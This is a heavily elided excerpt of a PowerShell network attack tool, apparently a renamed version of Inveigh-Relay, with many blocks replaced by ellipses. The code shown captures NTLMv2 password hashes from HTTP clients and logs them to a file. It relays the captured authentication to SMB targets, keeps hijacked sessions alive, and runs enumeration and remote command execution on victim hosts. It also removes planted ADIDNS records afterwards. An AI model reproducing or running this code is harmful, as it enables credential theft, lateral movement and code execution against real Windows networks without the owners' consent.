                        ...
                        if($NTLM_challenge -and $NTLM_response -and ($Innoc.machine_accounts -or (!$Innoc.machine_accounts -and -not $HTTP_NTLM_user_string.EndsWith('$'))))
                        {
                            $Innoc.NTLMv2_list.Add($HTTP_NTLM_hash) > $null
                        
                            if(!$Innoc.console_unique -or ($Innoc.console_unique -and $Innoc.NTLMv2_username_list -notcontains "$HTTP_source_IP $HTTP_username_full"))
                            {
                                $Innoc.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) NTLMv2 captured for $HTTP_username_full from $HTTP_source_IP($NTLM_host_string)`:$HTTP_source_Port`:") > $null
                                $Innoc.output_queue.Add($HTTP_NTLM_hash) > $null
                            }
                            else
                            {
                                $Innoc.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) NTLMv2 captured for $HTTP_username_full from $HTTP_source_IP($NTLM_host_string)`:$HTTP_source_Port`:`n[not unique]") > $null
                            }

                            if($Innoc.file_output -and (!$Innoc.file_unique -or ($Innoc.file_unique -and $Innoc.NTLMv2_username_list -notcontains "$HTTP_source_IP $HTTP_username_full")))
                            {
                                $Innoc.NTLMv2_file_queue.Add($HTTP_NTLM_hash) > $null
                                $Innoc.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) NTLMv2 written to " + "Innoc-NTLMv2.txt") > $null
                            }

                            if($Innoc.NTLMv2_username_list -notcontains "$HTTP_source_IP $HTTP_username_full")
                            {
                                $Innoc.NTLMv2_username_list.Add("$HTTP_source_IP $HTTP_username_full") > $null
                            }
                    ...
                    if($Innoc.SMB_relay -and $relay_step -eq 2)
                    {

                        if(!$Username -or $Username -contains $HTTP_NTLM_user_string -or $Username -contains $HTTP_username_full)
                        {

                            if($Innoc.machine_accounts -or (!$Innoc.machine_accounts -and -not $HTTP_NTLM_user_string.EndsWith('$')))
                            {

                                if($Innoc.relay_failed_login_table.$HTTP_username_full.Count -le $FailedLoginThreshold)
                                {

                                    $Innoc.output_queue.Add("[!] [$(Get-Date -format s)] Sending $NTLM_type response for $HTTP_username_full for relay to $Target") > $null
                                    ...
                                    if(!$SMB_relay_failed)
                                    {
                                        $Innoc.session_current = $Innoc.session_count
                                        $Innoc.session_message_ID_table.Add($Innoc.session_count,3)
                                        ...
                                        if($Attack -contains 'Session')
                                        {
                                            ...
                                            {
                                                $Innoc.session_socket_table[$Innoc.session_count] = $SMB_client
                                                $Innoc.session_table[$Innoc.session_count] = $session_ID
                                                $Innoc.session_lock_table[$Innoc.session_count] = 'open'
                                                ...
                                                Add-Member -InputObject $session_object -MemberType NoteProperty -Name Session $Innoc.session_count
                                                ...
                                                if($SMB_client.Connected)
                                                {
                                                    ...
                                                    $Innoc.session += $session_object
                                                    $Innoc.output_queue.Add("[!] [$(Get-Date -format s)] Session $($Innoc.session_count) added to session list") > $null
                                                }
                                        ...
                                        (!$Innoc.enumerate[$target_index].Enumerate -or
                                        (New-TimeSpan $Innoc.enumerate[$target_index].Enumerate $filter_date).Minutes -gt $RepeatEnumerate))
                                        {
                                        ...
                                        (!$Innoc.enumerate[$target_index].Execute -or (New-TimeSpan $Innoc.enumerate[$target_index].Execute $filter_date).Minutes -gt $RepeatExecute))
                                        {
                                            Invoke-SMBRelayExecute $SMB_client $SMB_version $SMB_user_ID $session_ID $process_ID_bytes $false
                                            $Innoc.enumerate[$target_index].Execute = $(Get-Date -format s)
                                        }

                                        if(!$SMB_client.Connected)
                                        {
                                            $Innoc.session[$Innoc.session_count] | Where-Object {$_.Status = "disconnected"}
                                        }
                                    ...
                                    if($Attack -notcontains 'Session' -and !$SMB_relay_failed -and $RelayAutoDisable -eq 'Y')
                                    {
                                        ...
                                        if($Attack -contains 'Enumerate')
                                        {
                                            ...
                                            for($i = 0;$i -lt $Innoc.enumerate.Count;$i++)
                                            {
                                                ...
                                                if($Innoc.enumerate[$i].Enumerate)
                                                {
                                                    $targets_enumerate_complete = @($Innoc.enumerate[$i].IP)
                                                }

                                            }

                                            if($Innoc.target_list -and $targets_enumerated)
                                            {
                                                $targets_enumerate_remaining = Compare-Object -ReferenceObject $Innoc.target_list -DifferenceObject $targets_enumerate_complete -PassThru | Where-Object {$_.SideIndicator -eq "<="}
                                            }
                                        ...
                                        if($Attack -contains 'Execute')
                                        {
                                            ...
                                            for($i = 0;$i -lt $Innoc.enumerate.Count;$i++)
                                            {
                                                ...
                                                if($Innoc.enumerate[$i].Execute)
                                                {
                                                    $targets_execute_complete = @($Innoc.execute[$i].IP)
                                                }
                                            ...
                                            if($Innoc.target_list -and $targets_enumerated)
                                            {
                                                $targets_execute_remaining = Compare-Object -ReferenceObject $Innoc.target_list -DifferenceObject $targets_execute_complete -PassThru | Where-Object {$_.SideIndicator -eq "<="}
                                            }
                                        ...
                                        {
                                            $Innoc.output_queue.Add("[!] [$(Get-Date -format s)] Relay auto disabled due to success") > $null
                                            $Innoc.SMB_relay = $false
                                        }
                                ...
                                {
                                    $Innoc.output_queue.Add("[!] [$(Get-Date -format s)] Relay stopped since $HTTP_username_full has exceeded failed login limit") > $null
                                    $SMB_client.Close()
                                    $relay_step = 0
                                }
                            ...
                            {
                                $Innoc.output_queue.Add("[!] [$(Get-Date -format s)] Relay stopped since $HTTP_NTLM_user_string appears to be a machine account") > $null
                                $SMB_client.Close()
                                $relay_step = 0
                            }
                        ...
                        {
                            $Innoc.output_queue.Add("[!] [$(Get-Date -format s)] $HTTP_username_full not on relay username list") > $null
                            $SMB_client.Close()
                            $relay_step = 0
                        }
...
$control_relay_scriptblock = 
{
    ...
    function Stop-InnocRunspace
    {
        ...
        if($ADIDNSCleanup -eq 'Y' -and $Innoc.ADIDNS_table.Count -gt 0)
        {
            [Array]$ADIDNS_table_keys_temp = $Innoc.ADIDNS_table.Keys

            foreach($ADIDNS_host in $ADIDNS_table_keys_temp)
            {
                
                if($Innoc.ADIDNS_table.$ADIDNS_host -ge 1)
                {
                    ...
                    try
                    {
                        ...
                        $Innoc.ADIDNS_table.$ADIDNS_host = $null
                    }
                    catch
                    {
                        $error_message = $_.Exception.Message
                        $error_message = $error_message -replace "`n",""
                        $Innoc.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
                        $Innoc.output_queue.Add("[-] [$(Get-Date -format s)] ADIDNS host record for $ADIDNS_host remove failed") > $null
                    }
    ...
    while($Innoc.relay_running -and !$Innoc.running)
    {

        if($RelayAutoExit -eq 'Y' -and !$Innoc.SMB_relay)
        {
            Start-Sleep -S 5
            Stop-InnocRunspace "disabled relay"
        }
        ...
        if($Innoc.file_output -and -not $Innoc.control)
        {
            ...
            while($Innoc.form_input_file_queue.Count -gt 0)
            {
                $Innoc.form_input_file_queue[0]|Out-File $Innoc.form_input_out_file -Append
                $Innoc.form_input_file_queue.RemoveAt(0)
            }
        ...
        if(!$Innoc.status_output -and !$Innoc.running)
        {
            Invoke-OutputQueueLoop
        }
...
$session_refresh_scriptblock = 
{
    ...
    while($Innoc.relay_running)
    {

        if($Innoc.session_socket_table.Count -gt 0)
        {
            $session = 0

            while($session -lt $Innoc.session_socket_table.Count)
            {
                $session_timespan =  New-TimeSpan $Innoc.session[$session]."Last Activity" $(Get-Date)
                
                if($Innoc.session_socket_table[$session].Connected -and $Innoc.session_lock_table[$session] -eq 'open' -and $session_timespan.Minutes -ge $SessionRefresh)
                {
                    $Innoc.session_lock_table[$session] = 'locked'
                    $client = $Innoc.session_socket_table[$session]
                    $client_stream = $client.GetStream()
                    $session_ID = $Innoc.session_table[$session]
                    $message_ID =  $Innoc.session_message_ID_table[$session]
                    $tree_ID = 0x00,0x00,0x00,0x00
                    $client_receive = New-Object System.Byte[] 1024
                    $SMB_path = "\\" + $Innoc.session_socket_table[$session].Client.RemoteEndpoint.Address.IPaddressToString + "\IPC$"
                    $SMB_path_bytes = [System.Text.Encoding]::Unicode.GetBytes($SMB_path)
                    $message_ID++
                    ...
                    {
                        $Innoc.output_queue.Add("[!] [$(Get-Date -format s)] Relay session $session has closed") > $null
                        $Innoc.session[$session] | Where-Object {$_.Status = "disconnected"}
                    }

                    if($Innoc.session_socket_table[$session].Connected)
                    {
                        $tree_ID = $client_receive[40..43]
                        Start-Sleep -s 1
                        $message_ID++
                    ...
                    $Innoc.session_lock_table[$Session] = 'open'
                    $Innoc.session[$Session] | Where-Object {$_."Last Activity" = Get-Date -format s}
                    $Innoc.session_message_ID_table[$Session] = $message_ID
                }
...
function ControlRelayLoop
{
    ...
    $control_relay_runspace.SessionStateProxy.SetVariable('Innoc',$Innoc)
...
function SessionRefreshLoop
{
    ...
    $session_refresh_runspace.SessionStateProxy.SetVariable('Innoc',$Innoc)
...
try
{
    ...
    if($ConsoleOutput -ne 'N')
    {
        ...
        :console_loop while(($Innoc.relay_running -and $Innoc.console_output) -or ($Innoc.console_queue.Count -gt 0 -and $Innoc.console_output))
        {
...
#>
    ...
    if($ADIDNS)
    {
        $ADIDNS_table_keys_temp = $Innoc.ADIDNS_table.Keys
    ...
    if($ADIDNSFailed)
    {
        ...
        foreach($ADIDNS_host in $ADIDNS_table_keys_temp)
        {
            ...
            if($Innoc.ADIDNS_table.$ADIDNS_host -eq 0)
            {
                Write-Output $ADIDNS_host
            }
